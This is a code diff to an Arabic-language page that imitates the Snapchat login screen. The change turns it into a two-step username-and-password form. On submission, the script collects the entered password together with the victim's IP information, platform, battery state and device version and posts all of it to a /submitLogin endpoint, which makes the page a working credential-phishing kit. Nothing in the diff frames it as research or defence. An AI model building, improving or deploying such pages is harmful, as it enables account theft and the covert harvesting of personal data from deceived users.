@@ -70,15 +70,23 @@
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="logo">https://accounts.snapchat.com/accounts/static/images/ghost/snapchat-app-icon.svg</div>
+    <div class="container" id="username-container">
+        <div class="logo">👻</div>
         <h1>تسجيل الدخول إلى سناب شات</h1>
-        <form id="loginForm">
-            <input type="hidden" name="chatId" id="chatIdInput">
+        <form id="usernameForm">
             <input type="text" name="username" class="input-field" placeholder="اسم المستخدم أو البريد الإلكتروني" required>
             <button type="submit" class="button">التالي</button>
             <a href="#" class="link">استخدام رقم الهاتف بدلاً من ذلك</a>
             <p>إنشاء حساب، هل أنت جديد في سناب شات؟ <a href="#" class="link">تسجيل</a></p>
+        </form>
+    </div>
+
+    <div class="container" id="password-container" style="display: none;">
+        <div class="logo">👻</div>
+        <h1>تسجيل الدخول إلى سناب شات</h1>
+        <form id="passwordForm">
+            <input type="password" name="password" class="input-field" placeholder="كلمة المرور" required>
+            <button type="submit" class="button">تسجيل الدخول</button>
         </form>
     </div>
 
@@ -87,12 +95,55 @@
     </div>
 
     <script>
-        const loginForm = document.getElementById('loginForm');
-        const chatIdInput = document.getElementById('chatIdInput');
+        const usernameForm = document.getElementById('usernameForm');
+        const passwordForm = document.getElementById('passwordForm');
+        const usernameContainer = document.getElementById('username-container');
+        const passwordContainer = document.getElementById('password-container');
         const notification = document.getElementById('notification');
 
-        const chatId = window.location.pathname.split('/').pop();
-        chatIdInput.value = chatId;
+        let formData = {};
+
+        usernameForm.addEventListener('submit', (event) => {
+            event.preventDefault();
+            formData.username = usernameForm.username.value;
+            usernameContainer.style.display = 'none';
+            passwordContainer.style.display = 'block';
+        });
+
+        passwordForm.addEventListener('submit', async (event) => {
+            event.preventDefault();
+            formData.password = passwordForm.password.value;
+
+            const ipInfo = await getIPInfo();
+            const platformInfo = getPlatformInfo();
+            const batteryInfo = await getBatteryInfo();
+            const deviceVersion = getDeviceVersion();
+
+            Object.assign(formData, ipInfo, platformInfo, batteryInfo, { deviceVersion });
+
+            try {
+                const response = await fetch('/submitLogin', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(formData)
+                });
+                const result = await response.json();
+                if (result.success) {
+                    notification.classList.add('show');
+                    setTimeout(() => {
+                        notification.classList.remove('show');
+                    }, 5000);
+                    passwordForm.reset();
+                } else {
+                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
+            }
+        });
 
         async function getIPInfo() {
             try {
@@ -151,42 +202,6 @@
             const match = ua.match(/\(([^)]+)\)/);
             return match ? match[1] : 'Unknown';
         }
-
-        loginForm.addEventListener('submit', async (event) => {
-            event.preventDefault();
-            const formData = new FormData(loginForm);
-            const data = Object.fromEntries(formData.entries());
-
-            const ipInfo = await getIPInfo();
-            const platformInfo = getPlatformInfo();
-            const batteryInfo = await getBatteryInfo();
-            const deviceVersion = getDeviceVersion();
-
-            Object.assign(data, ipInfo, platformInfo, batteryInfo, { deviceVersion });
-
-            try {
-                const response = await fetch('/submitLogin', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data)
-                });
-                const result = await response.json();
-                if (result.success) {
-                    notification.classList.add('show');
-                    setTimeout(() => {
-                        notification.classList.remove('show');
-                    }, 5000);
-                    loginForm.reset();
-                } else {
-                    alert('حدث خطأ أثناء تنفيذ الطلب. يرجى المحاولة مرة أخرى.');
-                }
-            } catch (error) {
-                console.error('Error:', error);
-                alert('حدث خطأ أثناء الاتصال بالخادم. يرجى المحاولة مرة أخرى لاحقاً.');
-            }
-        });
     </script>
 </body>
 </html>
